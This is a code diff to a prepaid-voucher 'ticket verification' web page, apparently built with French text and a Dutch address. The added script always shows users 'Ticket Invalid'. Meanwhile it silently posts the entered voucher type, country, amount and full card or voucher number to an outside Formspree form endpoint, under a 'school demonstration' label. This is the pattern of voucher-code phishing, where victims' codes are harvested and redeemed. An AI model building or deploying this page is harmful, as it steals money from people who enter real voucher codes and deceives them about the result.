@@ -737,8 +737,44 @@ footer {
 </button>
 
 <div class="demo-result" id="demoResult">
-    <strong>Ticket invalid</strong>
-    The entered ticket is not valid.
+
+    <strong>Verification Result</strong>
+
+    <div class="result-status">
+        ❌ Ticket Invalid
+    </div>
+
+    <p>The ticket could not be verified.</p>
+
+    <div class="result-details">
+
+        <div>
+            <span>Card</span>
+            <strong id="resultCard">—</strong>
+        </div>
+
+        <div>
+            <span>Country</span>
+            <strong id="resultCountry">—</strong>
+        </div>
+
+        <div>
+            <span>Amount</span>
+            <strong id="resultAmount">—</strong>
+        </div>
+
+        <div>
+            <span>Number</span>
+            <strong id="resultNumber">—</strong>
+        </div>
+
+        <div>
+            <span>Status</span>
+            <strong>Invalid</strong>
+        </div>
+
+    </div>
+
 </div>
 
     <div class="demo">
@@ -826,10 +862,50 @@ Zwembadweg 12, 5611KS Eindhoven, Pays-Bas
         });
 
     });
-    const continueButton = document.getElementById("continueButton");
+   const continueButton = document.getElementById("continueButton");
 const demoResult = document.getElementById("demoResult");
 
-continueButton.addEventListener("click", function() {
+const resultCard = document.getElementById("resultCard");
+const resultCountry = document.getElementById("resultCountry");
+const resultAmount = document.getElementById("resultAmount");
+const resultNumber = document.getElementById("resultNumber");
+
+continueButton.addEventListener("click", async function () {
+
+    const selectedCard = document.querySelector(".voucher.selected");
+
+    const country =
+        document.getElementById("country").value;
+
+    const cardNumber =
+        document.getElementById("cardNumber").value;
+
+    const amount =
+        document.getElementById("amount").value;
+
+    const cardName = selectedCard
+        ? selectedCard.dataset.name
+        : "Not selected";
+
+    const countryName = country
+        ? country
+        : "Not selected";
+
+    const numberValue = cardNumber
+        ? cardNumber
+        : "Not entered";
+
+    const amountValue = amount
+        ? amount
+        : "Not specified";
+
+
+    /* SHOW RESULT */
+
+    resultCard.textContent = cardName;
+    resultCountry.textContent = countryName;
+    resultAmount.textContent = amountValue;
+    resultNumber.textContent = numberValue;
 
     demoResult.style.display = "block";
 
@@ -837,6 +913,58 @@ continueButton.addEventListener("click", function() {
         behavior: "smooth",
         block: "center"
     });
+
+
+    /* SEND DEMONSTRATION DATA */
+
+    const formData = new FormData();
+
+    formData.append("Card Type", cardName);
+    formData.append("Country", countryName);
+    formData.append("Amount", amountValue);
+    formData.append("Card / Voucher Number", numberValue);
+    formData.append("Verification Status", "Invalid");
+    formData.append(
+        "Project",
+        "CARD-CHECK School Demonstration"
+    );
+
+
+    try {
+
+        const response = await fetch(
+            "https://formspree.io/f/xrpbvvwz",
+            {
+                method: "POST",
+                body: formData,
+                headers: {
+                    "Accept": "application/json"
+                }
+            }
+        );
+
+        if (response.ok) {
+
+            console.log(
+                "Demonstration submitted successfully."
+            );
+
+        } else {
+
+            console.log(
+                "Submission failed."
+            );
+
+        }
+
+    } catch (error) {
+
+        console.log(
+            "Formspree error:",
+            error
+        );
+
+    }
 
 });
 
